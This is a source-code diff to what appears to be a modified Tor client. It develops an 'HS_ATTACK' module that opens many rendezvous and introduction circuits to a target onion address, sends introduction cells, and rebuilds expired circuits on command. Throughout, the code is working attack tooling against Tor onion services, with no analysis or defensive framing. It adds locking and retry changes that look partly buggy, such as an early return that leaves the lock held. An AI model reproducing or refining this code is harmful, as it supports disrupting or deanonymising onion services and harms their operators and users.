@@ -20,6 +20,17 @@
  */
 static hs_rd_attack_t *attack_infos = NULL;
 
+static tor_mutex_t attack_mutex;
+
+
+#define LOCK_ATTACK() STMT_BEGIN  \
+  tor_mutex_acquire(&attack_mutex); \
+  STMT_END
+
+#define UNLOCK_ATTACK() STMT_BEGIN \
+  tor_mutex_release(&attack_mutex); \
+  STMT_END
+
 
 static int launch_new_rendezvous(){
   uint8_t flags = CIRCLAUNCH_NEED_UPTIME;
@@ -51,6 +62,7 @@ static int
 hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
   log_info(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
   int c = 0;
+  LOCK_ATTACK();
   while (attack_infos->rendcircs->num_used < nbr_circuits) {
     if (launch_new_rendezvous() < 0){
       c++;
@@ -58,6 +70,7 @@ hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
         return -1;
     }
   }
+  UNLOCK_ATTACK();
   // launch some more general circuit in the init phase for backup :)
   for (int i = 0; i < nbr_circuits/2; i++)
     circuit_launch(CIRCUIT_PURPOSE_C_GENERAL, CIRCLAUNCH_NEED_UPTIME);
@@ -74,7 +87,7 @@ hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
 static int hs_attack_init_intro_circuit(int retry, int monitoring) {
   //uint8_t flags = CIRCLAUNCH_ONEHOP_TUNNEL;
   uint8_t flags = CIRCLAUNCH_NEED_UPTIME;
-
+  int do_we_retry_intro = 0;
   /*if (retry == 0){*/
     /*log_info(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");*/
     /* kind of hack. We don't have ant_set_p_circid_chan(circ, p_circ_id, p_chan);_y circuit yet
@@ -98,32 +111,37 @@ static int hs_attack_init_intro_circuit(int retry, int monitoring) {
   int get_one;
   SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
     get_one = 0;
-    if (!circmap->extend_info) {
+    if (!circmap->extend_info && circmap->state_rend > REND_CIRC_BUILDING) {
       circmap->extend_info = rend_client_get_random_intro(
           circmap->rendcirc->rend_data);
-      get_one = 1;
+      if (circmap->extend_info)
+        get_one = 1;
     }
     if (!circmap->extend_info) {
-      log_info(LD_REND,
+      if (circmap->state_rend == REND_CIRC_READY_FOR_INTRO) {
+        rend_client_refetch_v2_renddesc(circmap->rendcirc->rend_data);
+        log_info(LD_REND,
           "HS_ATTACK: No intro point for '%s': re-fetching service descriptor an try later.\n",
           attack_infos->current_target);
-      if (circmap->rendcirc)
-        rend_client_refetch_v2_renddesc(circmap->rendcirc->rend_data);
+      }
+      else{
+        log_info(LD_REND,"HS_ATTACK: rendcirc not open yet\n");
+      }
       count_missing++;
     }
     else if(get_one) {
       log_info(LD_REND, "HS_ATTACK: Yay! we have an intropoint : %s\n", extend_info_describe(
-       circmap->extend_info));
+         circmap->extend_info));
     }
   } SMARTLIST_FOREACH_END(circmap);
   if (count_missing) {
     if (!monitoring) {
       attack_infos->retry_intro++;
-      control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
+      /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
     }
-    return 0;
+    /*return 0;*/
+    do_we_retry_intro = 1;
   }
-
   // Wait that all rendcirc have oppened -- kind of stupid
   /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {*/
     /*if (circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN) {*/
@@ -148,8 +166,8 @@ static int hs_attack_init_intro_circuit(int retry, int monitoring) {
   int count_failure = 0;
   SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
     if (circmap->state_intro == CIRC_NO_STATE){
-      if (circmap->introcirc->base_.state == CIRCUIT_STATE_OPEN
-           && circmap->state_rend >= REND_CIRC_READY_FOR_INTRO) {
+      if (circmap->introcirc->base_.state == CIRCUIT_STATE_OPEN &&
+          circmap->extend_info) {
         circmap->introcirc = circuit_launch_by_extend_info(
             CIRCUIT_PURPOSE_C_INTRODUCING, circmap->extend_info, flags);
         if (circmap->introcirc){
@@ -159,7 +177,7 @@ static int hs_attack_init_intro_circuit(int retry, int monitoring) {
         else {
           count_failure++;
           if (circmap->extend_info) {
-            extend_info_free(circmap->extend_info);
+            /*extend_info_free(circmap->extend_info);*/
             circmap->extend_info = NULL;
           }
           /*log_info(LD_REND, "HS_ATTACK: Launching a new general circ for backup\n");*/
@@ -177,17 +195,21 @@ static int hs_attack_init_intro_circuit(int retry, int monitoring) {
     /*we have circuit; change its purpose*/
     if (!monitoring) {
       attack_infos->retry_intro++;
-      control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
+      /*control_event_hs_attack(HS_ATTACK_RETRY_INTRO);*/
     }
-    return 0;
+    /*return 0;*/
+    do_we_retry_intro = 1;
   }
   else if (count_failure && retry >= RETRY_THRESHOLD*count_failure) {
     //tor_free(attack_infos->circ_to_intro->circ);
     //tor_free(attack_infos->circ_to_intro);
     log_debug(LD_REND, "HS_ATTACK: introcirc has failed to extend too much time\n");
-    return -1;
+    return 0;
   }
-  log_info(LD_REND, "HS_ATTACK: We have an intro circ building or ready !\n");
+  /*log_info(LD_REND, "HS_ATTACK: We have an intro circ building or ready !\n");*/
+  if (do_we_retry_intro && !monitoring) {
+    control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
+  }
   return 0;
 }
 
@@ -201,10 +223,11 @@ static int hs_attack_init_intro_circuit(int retry, int monitoring) {
 void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
   //return;
   int retval=0;
-  log_info(LD_REND, "HS_ATTACK: send_intro_cell_callback called !\n");
-  
   int launch = 0;
-  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
+  circ_info_t *circmap;
+  LOCK_ATTACK();
+  for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
+    circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
     if (rend_or_intro_circ == circmap->rendcirc) {
       if (circmap->state_intro == INTRO_CIRC_READY)
         launch = 1;
@@ -214,21 +237,22 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
         launch = 1;
     }
     if (launch){
-      circmap->introcirc->rend_data = circmap->rendcirc->rend_data;
+      circmap->introcirc->rend_data = rend_data_dup(circmap->rendcirc->rend_data);
       retval = rend_client_send_introduction(circmap->introcirc,
           circmap->rendcirc);
       if(retval < 0) {
-        log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
+        //log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
         // should do something if it happens -- kill circuit and try again ?
         // exit the prog if it happens too much ?
-        return;
+        break;
       }
+      log_info(LD_REND, "HS_ATTACK: rend_circ_intro_cell_sent !\n");
       circmap->state_rend = REND_CIRC_INTRO_CELL_SENT;
       circmap->state_intro = REND_CIRC_INTRO_CELL_SENT;
-      return;
+      break;
     }
-  } SMARTLIST_FOREACH_END(circmap);
-
+  }
+  UNLOCK_ATTACK();
 }
 
 /*
@@ -238,6 +262,7 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rend_or_intro_circ){
  */
 void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
   int count_ready = 0;
+  LOCK_ATTACK();
   SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {
     if (circmap->rendcirc == rendcirc) {
       log_info(LD_REND,"HS_ATTACK: Marking rendezvous circuit ready");
@@ -252,18 +277,24 @@ void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
     log_info(LD_REND, "HS_ATTACK: Seems that we are ready to launch the attack. Waiting instructions\n");
     control_event_hs_attack(HS_ATTACK_RD_READY);
   }
+  UNLOCK_ATTACK();
 }
 
 void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
   circ_info_t *circmap;
+  LOCK_ATTACK();
   for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
     circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
-    if (circmap->rendcirc == rendcirc) {
+    if (!circmap) {
+      log_debug(LD_REND, "HS_ATTACK: null circmap, index %d", circmaps_sl_idx);
+    }
+    else if (circmap->rendcirc == rendcirc) {
       log_info(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");
       circmap->state_rend = REND_CIRC_READY_FOR_INTRO;
       circmaps_sl_idx = smartlist_len(attack_infos->rendcircs);
     }
   }
+  UNLOCK_ATTACK();
   /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, circmap) {*/
     /*if (circmap->rendcirc == rendcirc) {*/
       /*log_info(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");*/
@@ -276,12 +307,23 @@ void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
 
 void hs_attack_mark_intro_ready(origin_circuit_t *introcirc) {
   log_info(LD_REND, "HS_ATTACK: Marking Introcirc ready\n");
-  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
+  circ_info_t *circmap;
+  LOCK_ATTACK();
+  for (int circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
+    circmap = smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
+    tor_assert(circmap);
     if (circmap->introcirc == introcirc) {
       circmap->state_intro = INTRO_CIRC_READY;
-      return;
+      circmaps_sl_idx = smartlist_len(attack_infos->rendcircs);
     }
-  }SMARTLIST_FOREACH_END(circmap);
+  }
+  UNLOCK_ATTACK();
+  /*SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {*/
+    /*if (circmap->introcirc == introcirc) {*/
+      /*circmap->state_intro = INTRO_CIRC_READY;*/
+      /*return;*/
+    /*}*/
+  /*}SMARTLIST_FOREACH_END(circmap);*/
 }
 
 
@@ -356,8 +398,10 @@ static int check_expiration(circ_info_t *circmap, int idx) {
   time_t now = time(NULL);
   log_info(LD_REND, "HS_ATTACK: Checking circ expiration\n");
   if (now - circmap->launched_at > HS_ATTACK_CIRC_TIMEOUT) {
-    circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);
-    circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);
+    /*circuit_mark_for_close(TO_CIRCUIT(circmap->rendcirc), END_CIRC_REASON_INTERNAL);*/
+    /*circuit_mark_for_close(TO_CIRCUIT(circmap->introcirc), END_CIRC_REASON_INTERNAL);*/
+    TO_CIRCUIT(circmap->rendcirc)->marked_for_close = 1;
+    TO_CIRCUIT(circmap->introcirc)->marked_for_close = 1;
     //if (circmap->extend_info) // We are maybe here because we didn't got an extend info
     //  extend_info_free(circmap->extend_info);
     smartlist_del(attack_infos->rendcircs, idx);
@@ -392,21 +436,21 @@ static void hs_attack_check_healthiness() {
      {
        circ_info_t *circmap;
        int circmaps_sl_idx;
-       int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
+       /*int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);*/
        int init_intro = 0;
-       for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; circmaps_sl_idx++) {
+       for (circmaps_sl_idx = 0; circmaps_sl_idx < smartlist_len(attack_infos->rendcircs); circmaps_sl_idx++) {
          circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
          if (circmap->state_rend != REND_CIRC_READY_FOR_RD ||
              circmap->state_intro != REND_CIRC_INTRO_CELL_SENT) {
            if (check_expiration(circmap, circmaps_sl_idx)) {
              circmaps_sl_idx--;
-             circmaps_sl_len--;
+             /*circmaps_sl_len--;*/
              removed_elements++;
            }
            init_intro = 1;
          }
        }
-       log_info(LD_REND, "HS_ATTACK: Checked healthiness of %d circuits", circmaps_sl_len+removed_elements);
+       log_info(LD_REND, "HS_ATTACK: Checked healthiness of %d circuits", smartlist_len(attack_infos->rendcircs)+removed_elements);
        if (init_intro)
          hs_attack_init_intro_circuit(attack_infos->retry_intro, 1);
      }
@@ -418,6 +462,7 @@ static void hs_attack_check_healthiness() {
         int circmaps_sl_len = smartlist_len(attack_infos->rendcircs);
         int init_intro = 0;
         for (circmaps_sl_idx = 0; circmaps_sl_idx < circmaps_sl_len; ++circmaps_sl_idx) {
+          break;
           circmap = (circ_info_t *) smartlist_get(attack_infos->rendcircs, circmaps_sl_idx);
           if ((circmap->rendcirc->base_.state != CIRCUIT_STATE_OPEN &&
               circmap->state_rend == REND_CIRC_READY_FOR_RD) || TO_CIRCUIT(circmap->rendcirc)->marked_for_close) {
@@ -446,7 +491,7 @@ static void hs_attack_check_healthiness() {
   for (int i = 0; i < removed_elements; i++){
     launch_new_rendezvous();
   }
-  circuit_close_all_marked();
+  /*circuit_close_all_marked();*/
   control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
 }
 
@@ -481,6 +526,7 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
     //attack_infos->rend_data = NULL;
     //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
     attack_infos->state = INITIALIZED;
+    tor_mutex_init(&attack_mutex);
     control_event_hs_attack(HS_ATTACK_MONITOR_HEALTHINESS);
   }
   switch(cmd) {
@@ -490,15 +536,21 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
         log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
         return NULL;
       }
+      LOCK_ATTACK();
       if (hs_attack_init_intro_circuit(attack_infos->retry_intro, 0) < 0) {
           log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
+          UNLOCK_ATTACK();
           return NULL; 
       }
+      UNLOCK_ATTACK();
       break;
     case SEND_RD: 
       hs_attack_launch(until); break;
     case CHECK_HEALTHINESS:
-      hs_attack_check_healthiness(); break;
+      LOCK_ATTACK();
+      hs_attack_check_healthiness();
+      UNLOCK_ATTACK();
+      break;
     default: break;
   }
   return attack_infos->stats;
